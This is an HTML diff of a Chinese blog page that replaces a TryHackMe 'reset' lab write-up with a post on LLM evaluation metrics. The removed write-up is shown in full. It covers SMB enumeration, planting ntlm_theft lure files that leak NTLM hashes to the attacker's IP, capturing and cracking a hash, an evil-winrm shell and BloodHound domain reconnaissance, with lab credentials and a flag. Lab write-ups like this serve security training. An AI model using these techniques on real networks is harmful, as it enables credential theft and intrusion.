@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://qingwan.top/2024/02/25/thm-reset靶场wp/"/>
+  <link rel="canonical" href="https://qingwan.top/2024/10/23/大模型常见指标的定义和运用/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,19 +34,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>TryHackMe-reset渗透靶场wp - 清风菀月轩</title>
+  <title>大模型常见评估指标及其运用 - 清风菀月轩</title>
   <meta name="keywords" content="undefined">
-  <meta desc name="description" content="TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题 - Qingwan - 清风菀月轩">
+  <meta desc name="description" content="常见评估大模型的指标以及其运用场景举例（通俗易懂版！） - Qingwan - 清风菀月轩">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="TryHackMe-reset渗透靶场wp">
-<meta property="og:url" content="https://qingwan.top/2024/02/25/THM-reset%E9%9D%B6%E5%9C%BAwp/index.html">
+<meta property="og:title" content="大模型常见评估指标及其运用">
+<meta property="og:url" content="https://qingwan.top/2024/10/23/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%B8%B8%E8%A7%81%E6%8C%87%E6%A0%87%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%BF%90%E7%94%A8/index.html">
 <meta property="og:site_name" content="清风菀月轩">
-<meta property="og:description" content="TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题">
+<meta property="og:description" content="常见评估大模型的指标以及其运用场景举例（通俗易懂版！）">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-02-25T09:17:18.172Z">
-<meta property="article:modified_time" content="2024-02-25T09:49:14.876Z">
+<meta property="article:published_time" content="2024-10-23T15:12:32.665Z">
+<meta property="article:modified_time" content="2024-10-29T14:13:34.353Z">
 <meta property="article:author" content="Qingwan">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2581,7 +2581,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://qingwan.top/2024/02/25/THM-reset靶场wp/">
+  <link itemprop="mainEntityOfPage" href="https://qingwan.top/2024/10/23/大模型常见指标的定义和运用/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="清风菀月轩">
   </span>
@@ -2602,7 +2602,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        TryHackMe-reset渗透靶场wp
+        大模型常见评估指标及其运用
       </h1>
       <div class='new-meta-box'>
         
@@ -2621,10 +2621,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    <a class="category-link" href="/categories/%E5%A4%A7%E6%A8%A1%E5%9E%8B/">大模型</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url"><span itemprop="name">渗透</span></a>
+        <a href="/categories/%E5%A4%A7%E6%A8%A1%E5%9E%8B/" itemprop="url"><span itemprop="name">大模型</span></a>
       </span>
     
   </div>
@@ -2633,10 +2633,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-02-25T17:17:18+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-10-23T23:12:32+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2024年2月25日</p>
+    <p>发布于：2024年10月23日</p>
   </a>
 </div>
 
@@ -2659,117 +2659,153 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>TryHackMe-reset渗透靶场的解决思路以及遇到的一些问题</p>
+    <p>常见评估大模型的指标以及其运用场景举例（通俗易懂版！）</p>
 <span id="more"></span>
-<p>实验需要我们获得两个flag，一个是<code>user</code>用户的flag，还有一个是获得<code>root</code>用户的flag<br>为了方便操作，我们先用openvpn连接到我们本地的kali虚拟机上（<a target="_blank" rel="noopener" href="https://tryhackme.com/room/openvpn">官方文章</a>）<br>但是连接openvpn用了我蛮久时间，这个对网络的要求蛮高的，有几个点，第一个kali里面也要挂梯子，然后一次不成功记得多试几次，还不行就试试在官网上换个节点再试试。<br>连接成功后，连接页面这里会显示连接成功，并且可以看到给我们分配的虚拟ip为<code>10.17.6.118</code>，这个ip是固定ip<br><img src="https://qingwan.top/images/251.png" class="lazyload" data-srcset="https://qingwan.top/images/251.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<h2 id="外部打点"><a href="#外部打点" class="headerlink" title="外部打点"></a>外部打点</h2><p>我们开启靶机，我们的靶机ip为<code>10.10.254.2</code>（后面靶机过期，所以重新打开靶机，ip地址会变化，除了固定分配的ip之外的其他ip都是我们的靶机ip）<br>先用nmap扫描一下端口，这里实战中如果觉得太速度太快了可能被发现的话，可以改一下速度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sC -sV 10.10.254.2</span><br></pre></td></tr></table></figure>
-<p>我们看到了开放了一些端口，而且还知道了域名为<code>THM</code>，计算机名字为<code>HAYStack</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-06 09:29:51Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/252.png" class="lazyload" data-srcset="https://qingwan.top/images/252.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>我们看到他打开了445端口，有SMB服务，打开了3389端口，可以尝试远程桌面连接。但是我们该怎么打进去呢，这里也没有web服务。<br>我们先从SMB服务入手吧，尝试一下用<code>CrackMapExec</code>进行SMB枚举</p>
-<h2 id="匿名用户访问"><a href="#匿名用户访问" class="headerlink" title="匿名用户访问"></a>匿名用户访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#尝试使用已知的用户名和密码进行身份验证、枚举可访问的共享资源等。</span><br><span class="line">crackmapexec smb 10.10.254.2 </span><br><span class="line"></span><br><span class="line">#添加了 --shares 参数。它的作用是在扫描过程中枚举目标主机上的共享资源。通过列出共享资源</span><br><span class="line">crackmapexec smb 10.10.254.2 --shares</span><br><span class="line"></span><br><span class="line">#指定用户名和密码进行身份验证</span><br><span class="line">crackmapexec smb 10.10.254.2 --shares -u QW -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
-<p>我们使用前两个命令，发现并没有显示什么共享资源，而且报错<code>STATUS_USER_SESSION_DELETED</code>，所以我们想到给他一个用户<br><img src="https://qingwan.top/images/253.png" class="lazyload" data-srcset="https://qingwan.top/images/253.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>第三个命令中我们指定了用户名为<code>QW</code>，密码为空，用户名为我们自己指定的任意值<br><img src="https://qingwan.top/images/254.png" class="lazyload" data-srcset="https://qingwan.top/images/254.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>这个命令就列出了我们的共享资源，但是为什么呢？这里<code>QW</code>这个用户名也是原来的计算机中不存在的呀。这里是由于当开启支持匿名访问的文件共享后，其他用户不需要输入用户名和口令，可以直接访问文件服务器的共享文件。所以这里的原因是由于靶机支持匿名登录。当使用SMB协议输入一个不存在的用户名时，系统会将我们作为匿名用户对待，并授予我们访问共享资源的权限。</p>
-<p>我们看到这里的<code>DATA</code>这个共享目录，有读和写的权限，那我们就访问一下这个目录<br>这里由于转义原因，我们需要多加对应个数的斜杠，回车会提示输入密码，随便输入一个即可，一次没成功，多试几次就行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &#x27;QW&#x27; \\\\10.10.99.197\\Data</span><br></pre></td></tr></table></figure>
-<p>然后我们看看他当前目录有哪些文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient -U &#x27;QW&#x27; \\\\10.10.99.197\\Data</span><br><span class="line">Password for [WORKGROUP\QW]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Wed Jul 19 16:40:57 2023</span><br><span class="line">  ..                                  D        0  Wed Jul 19 16:40:57 2023</span><br><span class="line">  onboarding                          D        0  Wed Feb  7 15:16:13 2024</span><br><span class="line"></span><br><span class="line">                7863807 blocks of size 4096. 3001419 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>切换到<code>onboarding</code>看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; cd onboarding</span><br><span class="line">smb: \onboarding\&gt; ls</span><br><span class="line">  .                                   D        0  Wed Feb  7 15:17:13 2024</span><br><span class="line">  ..                                  D        0  Wed Feb  7 15:17:13 2024</span><br><span class="line">  gmx2kujx.wlc.txt                    A      521  Tue Aug 22 02:21:59 2023</span><br><span class="line">  j1kmav5y.ogg.pdf                    A  3032659  Mon Jul 17 16:12:09 2023</span><br><span class="line">  qt014yev.xfy.pdf                    A  4700896  Mon Jul 17 16:11:53 2023</span><br><span class="line"></span><br><span class="line">                7863807 blocks of size 4096. 3001284 blocks available</span><br><span class="line">smb: \onboarding\&gt; ls</span><br><span class="line">  .                                   D        0  Wed Feb  7 15:19:43 2024</span><br><span class="line">  ..                                  D        0  Wed Feb  7 15:19:43 2024</span><br><span class="line">  htdrjeca.rtp.pdf                    A  4700896  Mon Jul 17 16:11:53 2023</span><br><span class="line">  spmna0aq.2ly.pdf                    A  3032659  Mon Jul 17 16:12:09 2023</span><br><span class="line">  tah3bqah.5si.txt                    A      521  Tue Aug 22 02:21:59 2023</span><br></pre></td></tr></table></figure>
-<p>我们看到两次访问的文件名发生了变化，那证明这个目录下存在活动。<br>我们将这三个文件下载下来查看一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mask &quot;&quot; </span><br><span class="line">recurse ON </span><br><span class="line">prompt OFF </span><br><span class="line">mget *</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<ol>
-<li><code>mask &quot;&quot;</code>: 这个命令将掩码设置为空，意味着匹配所有文件名。在批量操作中，掩码用于指定要匹配的文件名模式，如果将掩码设置为空，则表示匹配所有文件。</li>
-<li><code>recurse ON</code>: 这个命令将递归设置为打开状态。当递归设置为打开时，在批量操作中还会包括子目录下的文件。因此，如果有子目录，也会下载其中的文件。</li>
-<li><code>prompt OFF</code>: 这个命令将提示设置为关闭状态。在FTP批处理操作中，通常会询问用户是否要下载每个文件，如果将提示设置为关闭，则在下载过程中不会提示用户，而是自动执行下载操作。</li>
-<li><code>mget *</code>: 这个命令用于批量下载所有文件。根据前面设置的掩码、递归和提示选项，该命令将下载当前目录下的所有文件，包括子目录中的文件，且不会提示用户确认每个文件的下载。</li>
-</ol>
-</blockquote>
-<p> 通过以上几个命令，我们把<code>onboarding</code>目录下的文件下载到我们的机器上，我们查看一下txt文件里面的内容。<br><img src="https://qingwan.top/images/2531.png" class="lazyload" data-srcset="https://qingwan.top/images/2531.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>通过上面信息我们可以知道，我们的初始密码为：<code>ResetMe123!</code></p>
-<h3 id="ntlm-theft生成hash窃取文件获取hash值"><a href="#ntlm-theft生成hash窃取文件获取hash值" class="headerlink" title="ntlm theft生成hash窃取文件获取hash值"></a>ntlm theft生成hash窃取文件获取hash值</h3><p>上面我们说到这个目录下的文件名在时刻变化，所以我们如果把我们的文件也放在该目录下，那当受害者访问该文件时，我们就可以获取到他的<code>NTLM hash</code>。<br>这里我们要利用到<a target="_blank" rel="noopener" href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a>这个脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这里的ip为一开始THM给我们分配的ip，并不是靶机的ip</span><br><span class="line">python3 ntlm_theft.py -g all -s 10.17.6.118 -f qw</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/255.png" class="lazyload" data-srcset="https://qingwan.top/images/255.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>这将在我们当前目录下生成一个qw文件夹，我们进入该<code>qw</code>文件夹，然后进行SMB连接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -U &#x27;QW&#x27; \\\\10.10.0.69\\Data</span><br></pre></td></tr></table></figure>
-<p>然后上传对应文件，记得要在<code>onboarding</code>目录下上传</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put qw.lnk</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/256.png" class="lazyload" data-srcset="https://qingwan.top/images/256.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>再在<code>Responder</code>开启监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -v</span><br></pre></td></tr></table></figure>
-<p>过一会后收到用户的密码以及hash值<br><img src="https://qingwan.top/images/257.png" class="lazyload" data-srcset="https://qingwan.top/images/257.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>我们成功得到了<code>NTLNv2 hash</code>，并且还知道了用户名为<code>AUTOMATE</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.0.69</span><br><span class="line">[SMB] NTLMv2-SSP Username : THM\AUTOMATE</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:173a6d47a02a194d:E92F330550335AE2C9D349F0D66E5CAD:01010000000000000030F5BDEB59DA01FF1BD4164F02936400000000020008                                                                           003500440030005A0001001E00570049004E002D0046003400320037004A0034004D004400460                                                                               04800460004003400570049004E002D0046003400320037004A0034004D004400460048004600                                                                               2E003500440030005A002E004C004F00430041004C00030014003500440030005A002E004C004                                                                               F00430041004C00050014003500440030005A002E004C004F00430041004C00070008000030F5                                                                               BDEB59DA010600040002000000080030003000000000000000010000000020000074452431AFE                                                                               7A9850C284C766D876F15A0EF7CCCCE693088EB5563209FD083D40A0010000000000000000000                                                                               00000000000000000900200063006900660073002F00310030002E00310037002E0036002E003                                                                               100310038000000000000000000 </span><br></pre></td></tr></table></figure>
-
-<p>拿到了hash值，我们先用<code>hashcat</code>或者<code>john</code>爆破一下，保存hash值到<code>hash.txt</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force --show</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/258.png" class="lazyload" data-srcset="https://qingwan.top/images/258.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>得到密码为<code>Passw0rd1</code>，得到密码之后我们就尝试登录。<br>我们前面看到开启了<code>3389</code>端口，我们分别用kali和win10连接一下，发现都连接不上<br><img src="https://qingwan.top/images/259.png" class="lazyload" data-srcset="https://qingwan.top/images/259.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br><img src="https://qingwan.top/images/2510.png" class="lazyload" data-srcset="https://qingwan.top/images/2510.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>应该是当前的账户不能RDP<br>这里看了下网上的wp，用的是<code>evil-winrm</code>这个工具</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.141.138 -u AUTOMATE -p Passw0rd1</span><br></pre></td></tr></table></figure>
-<p>拿下shell<br><img src="https://qingwan.top/images/2511.png" class="lazyload" data-srcset="https://qingwan.top/images/2511.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<p>然后得到第一个user的flag<br><code>THM&#123;AUTOMATION_WILL_REPLACE_US&#125;</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\automate\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Documents&gt; pwd</span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line">----</span><br><span class="line">C:\Users\automate\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Documents&gt; hostname</span><br><span class="line">HayStack</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Documents&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Documents&gt; cd ../</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\automate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        6/14/2023   8:35 AM                3D Objects</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Contacts</span><br><span class="line">d-r---        7/14/2023   7:28 AM                Desktop</span><br><span class="line">d-r---        7/13/2023   3:49 PM                Documents</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Downloads</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Favorites</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Links</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Music</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Pictures</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Saved Games</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Searches</span><br><span class="line">d-r---        6/14/2023   8:35 AM                Videos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\automate&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\automate\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website</span><br><span class="line">-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website</span><br><span class="line">-a----        6/16/2023   4:35 PM             31 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; type user.txt</span><br><span class="line">THM&#123;AUTOMATION_WILL_REPLACE_US&#125;</span><br><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qingwan.top/images/2512.png" class="lazyload" data-srcset="https://qingwan.top/images/2512.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>这里有一个思考，那就是怎么想到用<code>Evil-WinRM</code>这个工具的呢？</p>
-<blockquote>
-<p><code>WinRM = Windows Remote Management</code>，即<strong>Windows远程管理</strong></p>
-</blockquote>
-<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>我们拿下了第一台机器之后，就看一下域内还有哪些其他的机器，下一步我们的目标是拿下域控<br>我们输入<code>systeminfo</code>命令查看，发现我们没有权限执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; systeminfo</span><br><span class="line">Program &#x27;systeminfo.exe&#x27; failed to run: Access is deniedAt line:1 char:1</span><br><span class="line">+ systeminfo</span><br><span class="line">+ ~~~~~~~~~~.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ systeminfo</span><br><span class="line">+ ~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandFailed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>查询一下域内用户的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; net user /domain</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">3091731410SA             3811465497SA             3966486072SA</span><br><span class="line">Administrator            ANDY_BLACKWELL           AUGUSTA_HAMILTON</span><br><span class="line">AUTOMATE                 CECILE_WONG              CHERYL_MULLINS</span><br><span class="line">CHRISTINA_MCCORMICK      CRUZ_HALL                CYRUS_WHITEHEAD</span><br><span class="line">DANIEL_CHRISTENSEN       DARLA_WINTERS            DEANNE_WASHINGTON</span><br><span class="line">ELLIOT_CHARLES           ERNESTO_SILVA            FANNY_ALLISON</span><br><span class="line">Guest                    HORACE_BOYLE             HOWARD_PAGE</span><br><span class="line">JULIANNE_HOWE            krbtgt                   LEANN_LONG</span><br><span class="line">LETHA_MAYO               LILY_ONEILL              LINDSAY_SCHULTZ</span><br><span class="line">MARCELINO_BALLARD        MARION_CLAY              MICHEL_ROBINSON</span><br><span class="line">MITCHELL_SHAW            MORGAN_SELLERS           RAQUEL_BENSON</span><br><span class="line">RICO_PEARSON             ROSLYN_MATHIS            SHAWNA_BRAY</span><br><span class="line">STEWART_SANTANA          TABATHA_BRITT            TED_JACOBSON</span><br><span class="line">TRACY_CARVER             TREVOR_MELTON</span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure>
-<p>然后再查询一下域控的主机名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\automate\Desktop&gt; net group &quot;Domain Controllers&quot; /domain</span><br><span class="line">Group name     Domain Controllers</span><br><span class="line">Comment        All domain controllers in the domain</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Guest                    HAYSTACK$                HOWARD_PAGE</span><br><span class="line">MORGAN_SELLERS</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>然后查看一下域管的名字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
-<p><img src="https://qingwan.top/images/2513.png" class="lazyload" data-srcset="https://qingwan.top/images/2513.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>可以知道域管的名字为<code>Administrator</code></p>
-<p>由一开始查域内用户可知，我们现在就是要提权到<code>Administrator</code>域管用户，然后再横向移动到域控</p>
-<p>现在我们利用一下<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">Bloodhound</a>进行一下域内的信息收集</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.188.230 --dns-tcp -d THM.CORP -u &#x27;automate&#x27; -p &#x27;Passw0rd1&#x27; -c All --zip</span><br></pre></td></tr></table></figure>
